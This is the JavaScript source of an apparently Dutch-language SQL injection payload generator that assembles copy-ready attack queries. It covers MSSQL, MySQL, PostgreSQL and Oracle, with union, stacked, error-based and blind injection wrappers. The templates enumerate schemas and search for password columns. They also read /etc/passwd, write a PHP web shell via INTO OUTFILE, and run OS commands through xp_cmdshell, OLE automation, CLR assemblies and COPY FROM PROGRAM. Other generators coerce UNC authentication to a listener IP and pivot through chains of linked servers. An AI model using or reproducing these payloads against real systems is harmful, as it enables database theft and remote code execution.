// SQL Query Generator — client-side query building voor copy-paste
(function () {
  'use strict';

  var root = document.getElementById('tab-generator');
  if (!root) return;

  // ---- helpers ----

  function $(id) { return document.getElementById(id); }

  function esc(s) {
    return s.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
  }

  function copyText(text, btn) {
    navigator.clipboard.writeText(text).then(function () {
      var orig = btn.textContent;
      btn.textContent = 'Gekopieerd!';
      setTimeout(function () { btn.textContent = orig; }, 1200);
    });
  }

  // ---- query templates per DB ----

  var QUERIES = {
    MSSQL: {
      version:     function () { return 'SELECT @@version;'; },
      user:        function () { return 'SELECT SYSTEM_USER;'; },
      hostname:    function () { return 'SELECT @@servername;'; },
      is_sysadmin: function () { return "SELECT IS_SRVROLEMEMBER('sysadmin');"; },
      databases:   function () { return 'SELECT name FROM sys.databases;'; },
      tables:      function (p) { return 'SELECT TABLE_NAME FROM ' + (p.database || 'master') + '.information_schema.tables;'; },
      columns:     function (p) { return "SELECT COLUMN_NAME, DATA_TYPE FROM " + (p.database || 'master') + ".information_schema.columns WHERE TABLE_NAME = '" + (p.table || 'users') + "';"; },
      extract:     function (p) { return 'SELECT ' + (p.columns || '*') + ' FROM ' + (p.database || 'master') + '.dbo.' + (p.table || 'users') + ';'; },
      count:       function (p) { return 'SELECT COUNT(*) FROM ' + (p.database || 'master') + '.dbo.' + (p.table || 'users') + ';'; },
      search:      function (p) { return "SELECT TABLE_NAME, COLUMN_NAME FROM " + (p.database || 'master') + ".information_schema.columns WHERE COLUMN_NAME LIKE '%" + (p.keyword || 'pass') + "%';"; },
    },
    MySQL: {
      version:     function () { return 'SELECT @@version;'; },
      user:        function () { return 'SELECT user();'; },
      hostname:    function () { return 'SELECT @@hostname;'; },
      databases:   function () { return 'SELECT schema_name FROM information_schema.schemata;'; },
      tables:      function (p) { return "SELECT table_name FROM information_schema.tables WHERE table_schema='" + (p.database || 'mysql') + "';"; },
      columns:     function (p) { return "SELECT column_name, data_type FROM information_schema.columns WHERE table_schema='" + (p.database || 'mysql') + "' AND table_name='" + (p.table || 'user') + "';"; },
      extract:     function (p) { return 'SELECT ' + (p.columns || '*') + ' FROM ' + (p.database || 'mysql') + '.' + (p.table || 'user') + ';'; },
      count:       function (p) { return 'SELECT COUNT(*) FROM ' + (p.database || 'mysql') + '.' + (p.table || 'user') + ';'; },
      search:      function (p) { return "SELECT table_name, column_name FROM information_schema.columns WHERE column_name LIKE '%" + (p.keyword || 'pass') + "%';"; },
      file_read:   function (p) { return "SELECT LOAD_FILE('" + (p.filepath || '/etc/passwd') + "');"; },
      file_write:  function (p) { return "SELECT '" + (p.content || '<?php system($_GET[\"cmd\"]); ?>') + "' INTO OUTFILE '" + (p.filepath || '/var/www/html/shell.php') + "';"; },
    },
    PostgreSQL: {
      version:     function () { return 'SELECT version();'; },
      user:        function () { return 'SELECT current_user;'; },
      hostname:    function () { return 'SELECT inet_server_addr();'; },
      is_superuser:function () { return "SELECT usesuper FROM pg_user WHERE usename = current_user;"; },
      databases:   function () { return 'SELECT datname FROM pg_database;'; },
      tables:      function (p) { return "SELECT table_name FROM information_schema.tables WHERE table_schema='" + (p.schema || 'public') + "';"; },
      columns:     function (p) { return "SELECT column_name, data_type FROM information_schema.columns WHERE table_name='" + (p.table || 'users') + "';"; },
      extract:     function (p) { return 'SELECT ' + (p.columns || '*') + ' FROM ' + (p.table || 'users') + ';'; },
      count:       function (p) { return 'SELECT COUNT(*) FROM ' + (p.table || 'users') + ';'; },
      search:      function (p) { return "SELECT table_name, column_name FROM information_schema.columns WHERE column_name LIKE '%" + (p.keyword || 'pass') + "%';"; },
      file_read:   function (p) { return "SELECT pg_read_file('" + (p.filepath || '/etc/passwd') + "');"; },
      rce:         function (p) { return "COPY cmd_exec FROM PROGRAM '" + (p.command || 'id') + "';"; },
    },
    Oracle: {
      version:     function () { return 'SELECT banner FROM v$version WHERE ROWNUM=1;'; },
      user:        function () { return 'SELECT user FROM dual;'; },
      hostname:    function () { return 'SELECT host_name FROM v$instance;'; },
      is_dba:      function () { return "SELECT GRANTED_ROLE FROM DBA_ROLE_PRIVS WHERE GRANTEE = user;"; },
      databases:   function () { return 'SELECT DISTINCT owner FROM all_tables;'; },
      tables:      function (p) { return "SELECT table_name FROM all_tables WHERE owner='" + (p.schema || 'SYSTEM') + "';"; },
      columns:     function (p) { return "SELECT column_name, data_type FROM all_tab_columns WHERE table_name='" + (p.table || 'USERS') + "';"; },
      extract:     function (p) { return 'SELECT ' + (p.columns || '*') + ' FROM ' + (p.schema || 'SYSTEM') + '.' + (p.table || 'USERS') + ';'; },
      count:       function (p) { return 'SELECT COUNT(*) FROM ' + (p.schema || 'SYSTEM') + '.' + (p.table || 'USERS') + ';'; },
      search:      function (p) { return "SELECT table_name, column_name FROM all_tab_columns WHERE column_name LIKE '%" + (p.keyword || 'PASS') + "%';"; },
    },
  };

  // ---- injection wrappers ----

  function wrapInjection(query, ctx) {
    var prefix = ctx.prefix || '';
    var suffix = ctx.suffix || '';
    var numCols = parseInt(ctx.numCols) || 0;

    switch (ctx.injection) {
      case 'union':
        if (numCols < 1) numCols = 3;
        var nulls = [];
        for (var i = 0; i < numCols; i++) nulls.push('NULL');
        // Zet het subquery in kolom 1
        nulls[0] = '(' + query.replace(/;$/, '') + ')';
        return prefix + "' UNION SELECT " + nulls.join(',') + suffix + '--';
      case 'stacked':
        return prefix + "'; " + query + suffix + '--';
      case 'error':
        return prefix + "' AND 1=CONVERT(int,(" + query.replace(/;$/, '') + ')' + ')' + suffix + '--';
      case 'blind_bool':
        return prefix + "' AND (SELECT CASE WHEN (" + query.replace(/;$/, '') + ")!=0 THEN 1 ELSE 1/0 END)" + suffix + '--';
      case 'blind_time':
        return prefix + "'; IF (" + query.replace(/;$/, '') + ") WAITFOR DELAY '0:0:5'" + suffix + '--';
      default:
        return query;
    }
  }

  // ---- MSSQL advanced queries ----

  var MSSQL_ADV = {
    xpcmd_enable: function (p) {
      return "EXEC sp_configure 'show advanced options', 1; RECONFIGURE;\n" +
             "EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;\n" +
             "EXEC master..xp_cmdshell '" + (p.command || 'whoami') + "';";
    },
    xpcmd_disable: function () {
      return "EXEC sp_configure 'xp_cmdshell', 0; RECONFIGURE;\n" +
             "EXEC sp_configure 'show advanced options', 0; RECONFIGURE;";
    },
    unc_dirtree: function (p) {
      return "EXEC master..xp_dirtree '\\\\" + (p.listener || '10.0.0.1') + "\\share';";
    },
    unc_fileexist: function (p) {
      return "EXEC master..xp_fileexist '\\\\" + (p.listener || '10.0.0.1') + "\\share\\test';";
    },
    unc_subdirs: function (p) {
      return "EXEC master..xp_subdirs '\\\\" + (p.listener || '10.0.0.1') + "\\share';";
    },
    ole_rce: function (p) {
      return "EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;\n" +
             "DECLARE @o INT;\n" +
             "EXEC sp_OACreate 'wscript.shell', @o OUT;\n" +
             "EXEC sp_OAMethod @o, 'run', null, '" + (p.command || 'whoami') + "';";
    },
    clr_assembly: function () {
      return "-- Stap 1: Compileer C# DLL met gewenste functie\n" +
             "-- Stap 2: Converteer naar hex bytes (0x4D5A...)\n" +
             "ALTER DATABASE master SET TRUSTWORTHY ON;\n" +
             "CREATE ASSEMBLY cmd_exec FROM 0x4D5A... WITH PERMISSION_SET = UNSAFE;\n" +
             "CREATE PROCEDURE [dbo].[cmd_exec] @execCommand NVARCHAR(4000)\n" +
             "AS EXTERNAL NAME [cmd_exec].[StoredProcedures].[cmd_exec];\n" +
             "EXEC cmd_exec 'whoami';";
    },
    linked_discover: function () {
      return "SELECT srvname, srvproduct, providername, datasource\n" +
             "FROM master..sysservers WHERE isremote = 0;";
    },
    linked_version: function (p) {
      return 'SELECT * FROM OPENQUERY("' + (p.linkedSrv || 'LINKED_SERVER') + '", \'SELECT @@version\');';
    },
    linked_whoami: function (p) {
      return 'SELECT * FROM OPENQUERY("' + (p.linkedSrv || 'LINKED_SERVER') + '", \'SELECT SYSTEM_USER\');';
    },
  };

  // ---- linked server nesting ----

  function buildOpenqueryChain(chain, innerQuery) {
    if (!chain.length) return innerQuery;
    var q = innerQuery;
    for (var i = chain.length - 1; i >= 0; i--) {
      var depth = chain.length - i;
      var quotes = "'";
      for (var d = 1; d < depth; d++) quotes += quotes;
      // Escape inner quotes: voor elk nesting-niveau verdubbelen
      var escaped = q;
      for (var e = 0; e < depth - 1; e++) {
        escaped = escaped.replace(/'/g, "''");
      }
      q = 'SELECT * FROM OPENQUERY("' + chain[i] + '", ' + quotes + escaped + quotes + ')';
    }
    return q;
  }

  function buildExecAtChain(chain, innerQuery) {
    if (!chain.length) return innerQuery;
    var q = innerQuery;
    for (var i = chain.length - 1; i >= 0; i--) {
      var escaped = q.replace(/'/g, "''");
      q = "EXEC ('" + escaped + "') AT [" + chain[i] + "]";
    }
    return q;
  }

  function buildLinkedXpcmd(chain, command) {
    var enable = "sp_configure ''show advanced options'', 1; RECONFIGURE; " +
                 "sp_configure ''xp_cmdshell'', 1; RECONFIGURE; " +
                 "xp_cmdshell ''" + (command || 'whoami') + "''";
    if (!chain.length) {
      return "EXEC sp_configure 'show advanced options', 1; RECONFIGURE;\n" +
             "EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;\n" +
             "EXEC master..xp_cmdshell '" + (command || 'whoami') + "';";
    }
    if (chain.length === 1) {
      return "EXEC ('" + enable + "') AT [" + chain[0] + "]";
    }
    // Diepere keten: wrap in EXEC AT
    var inner = enable;
    for (var i = chain.length - 1; i >= 0; i--) {
      var escaped = inner.replace(/'/g, "''");
      inner = "EXEC ('" + escaped + "') AT [" + chain[i] + "]";
    }
    return inner;
  }

  // ---- render output ----

  function renderOutput(containerId, queries) {
    var container = $(containerId);
    if (!container) return;
    var html = '';
    for (var i = 0; i < queries.length; i++) {
      var q = queries[i];
      html += '<div class="gen-block">';
      html += '<div class="gen-label">' + esc(q.label) + '</div>';
      html += '<div class="gen-query"><pre><code>' + esc(q.sql) + '</code></pre>';
      html += '<button class="btn-sm btn-copy" data-sql="' + i + '">Kopieer</button>';
      html += '</div></div>';
    }
    container.innerHTML = html;

    // Copy handlers
    container.querySelectorAll('.btn-copy').forEach(function (btn) {
      btn.addEventListener('click', function () {
        var idx = parseInt(this.dataset.sql);
        copyText(queries[idx].sql, this);
      });
    });
  }

  // ---- General SQL generator ----

  $('gen-sql-btn').addEventListener('click', function () {
    var dbType = $('gen-dbtype').value;
    var templates = QUERIES[dbType];
    if (!templates) return;

    var p = {
      database: $('gen-database').value,
      schema:   $('gen-schema').value,
      table:    $('gen-table').value,
      columns:  $('gen-columns').value,
      keyword:  $('gen-keyword').value,
      filepath: $('gen-filepath').value,
      content:  $('gen-content').value,
      command:  $('gen-command').value,
    };

    var ctx = {
      injection: $('gen-injection').value,
      prefix:    $('gen-prefix').value,
      suffix:    $('gen-suffix').value,
      numCols:   $('gen-numcols').value,
    };

    var results = [];
    for (var key in templates) {
      var raw = templates[key](p);
      var wrapped = wrapInjection(raw, ctx);
      results.push({ label: dbType + ' — ' + key, sql: wrapped });
    }

    renderOutput('gen-sql-output', results);
  });

  // ---- MSSQL Advanced generator ----

  $('gen-mssql-btn').addEventListener('click', function () {
    var p = {
      command:   $('gen-ms-command').value || 'whoami',
      listener:  $('gen-ms-listener').value || '10.0.0.1',
      linkedSrv: $('gen-ms-linkedsrv').value || 'LINKED_SERVER',
    };

    var ctx = {
      injection: $('gen-ms-injection').value,
      prefix:    $('gen-ms-prefix').value,
      suffix:    $('gen-ms-suffix').value,
      numCols:   $('gen-ms-numcols').value,
    };

    var results = [];
    for (var key in MSSQL_ADV) {
      var raw = MSSQL_ADV[key](p);
      var wrapped = wrapInjection(raw, ctx);
      results.push({ label: 'MSSQL — ' + key, sql: wrapped });
    }

    renderOutput('gen-mssql-output', results);
  });

  // ---- Linked Server Nested Query generator ----

  $('gen-link-btn').addEventListener('click', function () {
    var chainStr = $('gen-link-chain').value.trim();
    if (!chainStr) return;
    var chain = chainStr.split(',').map(function (s) { return s.trim(); }).filter(Boolean);
    var innerQuery = $('gen-link-query').value || 'SELECT @@servername';
    var command = $('gen-link-command').value || 'whoami';

    var results = [];

    // OPENQUERY variant
    results.push({
      label: 'OPENQUERY — ' + chain.join(' \u2192 ') + ' — query',
      sql: buildOpenqueryChain(chain, innerQuery),
    });

    // EXEC AT variant
    results.push({
      label: 'EXEC AT — ' + chain.join(' \u2192 ') + ' — query',
      sql: buildExecAtChain(chain, innerQuery),
    });

    // xp_cmdshell via EXEC AT chain
    results.push({
      label: 'EXEC AT — ' + chain.join(' \u2192 ') + ' — xp_cmdshell',
      sql: buildLinkedXpcmd(chain, command),
    });

    // OPENQUERY met xp_cmdshell
    var xpcmdInner = "EXEC master..xp_cmdshell '" + command + "'";
    results.push({
      label: 'OPENQUERY — ' + chain.join(' \u2192 ') + ' — xp_cmdshell',
      sql: buildOpenqueryChain(chain, xpcmdInner),
    });

    // Enable xp_cmdshell via OPENQUERY
    var enableInner = "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; " +
                      "EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;";
    results.push({
      label: 'OPENQUERY — ' + chain.join(' \u2192 ') + ' — enable xp_cmdshell',
      sql: buildOpenqueryChain(chain, enableInner),
    });

    // Discover linked servers op de laatste server
    var discoverInner = 'SELECT srvname FROM master..sysservers WHERE isremote=0';
    results.push({
      label: 'OPENQUERY — ' + chain.join(' \u2192 ') + ' — discover links',
      sql: buildOpenqueryChain(chain, discoverInner),
    });

    // Check sysadmin op de laatste server
    var sysadminInner = "SELECT IS_SRVROLEMEMBER('sysadmin')";
    results.push({
      label: 'OPENQUERY — ' + chain.join(' \u2192 ') + ' — check sysadmin',
      sql: buildOpenqueryChain(chain, sysadminInner),
    });

    // Injection wrapping
    var ctx = {
      injection: $('gen-link-injection').value,
      prefix:    $('gen-link-prefix').value,
      suffix:    $('gen-link-suffix').value,
      numCols:   $('gen-link-numcols').value,
    };

    if (ctx.injection !== 'raw') {
      results = results.map(function (r) {
        return { label: r.label + ' [' + ctx.injection + ']', sql: wrapInjection(r.sql, ctx) };
      });
    }

    renderOutput('gen-link-output', results);
  });

})();
